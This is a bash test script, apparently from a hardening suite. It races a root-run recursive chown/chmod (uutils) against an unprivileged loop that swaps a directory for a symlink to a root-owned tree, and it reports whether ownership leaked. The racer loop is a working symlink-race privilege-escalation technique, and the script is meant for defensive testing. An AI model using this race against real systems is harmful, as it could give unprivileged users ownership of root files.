#!/bin/bash
# A05 (threat 1, root-run tools): make_writable runs `chown -RhP <app>` then `chmod -R u+w` (uutils 0.10 on
# Ubuntu 26.04) on a release directory the app already owns while it recurses. Race: the app swaps a
# subdirectory for a symlink to a root-owned tree during the walk. Exit 0 if the target stayed root's.
. "$(dirname "$0")/lib.sh"
out=$(rootsh 'rm -rf /opt/rt /opt/victim; mkdir -p /opt/victim/sub; for i in $(seq 1 200); do touch /opt/victim/sub/f$i; done
mkdir /opt/rt; chown nobody /opt/rt
cat > /opt/racer.sh <<"E"
cd /opt/rt
while :; do
  mkdir -p d.real/x 2>/dev/null; for i in $(seq 1 30); do mkdir -p d.real/x/y$i 2>/dev/null; done
  mv -T d.real d 2>/dev/null; ln -sfn /opt/victim d.link 2>/dev/null; mv -T d.link d 2>/dev/null; rm -rf d d.link 2>/dev/null
done
E
setpriv --reuid=nobody --regid=nogroup --clear-groups bash /opt/racer.sh 2>/dev/null & r=$!
hit=""; for i in $(seq 1 400); do chown -RhP nobody:nogroup /opt/rt 2>/dev/null; chmod -R u+w /opt/rt 2>/dev/null
  o=$(stat -c %U /opt/victim/sub/f1 /opt/victim/sub /opt/victim | sort -u | tr "\n" " "); [[ $o != "root " ]] && { hit="round $i: $o"; break; }; done
kill $r; wait 2>/dev/null; echo "${hit:-no hit in 400 rounds} ($(chown --version | head -1))"; rm -rf /opt/rt /opt/victim /opt/racer.sh' 2>&1)
echo "$out" >&2
if echo "$out" | grep -q '^round'; then succeeded "root chowned a tree outside the release"
elif echo "$out" | grep -q '^no hit in 400 rounds'; then blocked "uutils chown/chmod did not follow the swapped link"
else inconclusive "the race did not run to the end"; fi
